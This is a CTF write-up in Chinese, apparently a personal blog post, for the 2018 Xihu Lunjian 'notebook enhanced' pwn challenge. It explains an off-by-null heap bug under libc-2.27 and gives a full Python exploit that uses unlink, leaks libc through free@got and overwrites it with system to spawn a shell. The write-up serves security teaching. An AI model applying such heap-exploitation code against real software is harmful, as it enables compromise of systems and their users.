# 西湖论剑_2018_小陈的笔记本加强版



### 总结

常规的`libc-2.27`版本下的`off by null`，`PIE`也没有开启。但是没有办法直接用`bss`上的堆指针去泄露和修改，所有还是选择了两个大的`chunk`进行`unlink`

<!-- more -->

### 题目分析

#### checksec

![image-20211017171750709](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211017171750709.png)

### 漏洞点

用户获取用户输入的函数存在`off by null`：

![image-20211017171942630](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211017171942630.png)

### 利用思路

1. 三明治结构，中间夹住一个`0x80`的存储有指针和长度和一个`0x30`存储`content`的`chunk`
2. `unlink`，然后分配到`0x80`，修改指针为`free@got`和长度
3. 泄露出`libc`地址，利用`edit`修改`free@got`为`system`
4. 释放`/bin/sh`块获取`shell`

### EXP

`exp`均使用我自己写的小工具`pwncli`编写，下面有链接，欢迎试用~

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

    
def add(size, data="default", name="lynne"):
    if len(data) < size:
        data += b"\n" if isinstance(data, bytes) else "\n"
    p.sendlineafter(">", "1")
    p.sendlineafter("please enter the name of the notebook:", name)
    p.sendlineafter("please enter the length of the content:", str(size))
    p.sendafter("please enter the content:", data)


def edit(idx, data):
    p.sendlineafter(">", "2")
    p.sendlineafter("please enter the notebook id to edit:", str(idx))
    p.sendafter("please enter the content of the notebook:", data)


def show(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("please enter the notebook id to show:", str(idx))
    msg = p.recvlines(2)
    info(f"Get msg: {msg}")
    return msg

def dele(idx):
    p.sendlineafter(">", "4")
    p.sendlineafter("please enter the notebook id to delete:", str(idx))

"""
libc-2.27 off by null -- malloc 
"""
# unlink
add(0x10) # 0
add(0x10) # 1
dele(0) 

add(0x420) # 0
add(0x28) # 2
dele(1) 
add(0x4f0) # 1
add(0x10, "cat /flag||a", "cat /flag||a") # 3

# off by null
dele(0)
edit(2, flat({0x20: 0x4f0}))
dele(1)

add(0x4b0, flat({0x4a0: [6, elf.got['free']]}))

_, m = show(2)
libc_base_addr = u64_ex(m[-6:]) - 0x97950
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

edit(2, p64(libc.sym.system)[:6])

dele(3)
p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-10-17-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2018-%E5%B0%8F%E9%99%88%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%8A%A0%E5%BC%BA%E7%89%88/  

